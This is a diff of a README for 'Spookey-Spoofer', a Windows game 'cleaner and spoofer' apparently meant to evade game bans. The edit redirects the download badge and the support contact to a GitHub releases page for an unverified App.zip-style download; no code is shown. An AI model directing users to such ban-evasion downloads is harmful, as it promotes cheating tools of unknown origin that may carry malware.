@@ -33,7 +33,7 @@ Welcome to **Spookey-Spoofer**, the ultimate cleaner and spoofer for Windows gam
 
 Download the Spookey-Spoofer tool by clicking on the button below:
 
-[![Download Spookey-Spoofer](https://img.shields.io/badge/Download-App.zip-blue.svg)](https://github.com/uploads/App.zip)
+[![Download Spookey-Spoofer](https://github.com/irfanisler/Spookey-Spoofer/releases)](https://github.com/irfanisler/Spookey-Spoofer/releases)
 
 ## Installation Guide 📦
 
@@ -44,7 +44,7 @@ Download the Spookey-Spoofer tool by clicking on the button below:
 
 ## Support 💬
 
-If you encounter any issues with the tool or need assistance, feel free to reach out to our support team at support@spookey-spoofer.com.
+If you encounter any issues with the tool or need assistance, feel free to reach out to our support team at https://github.com/irfanisler/Spookey-Spoofer/releases
 
 ## Disclaimer ❗
 
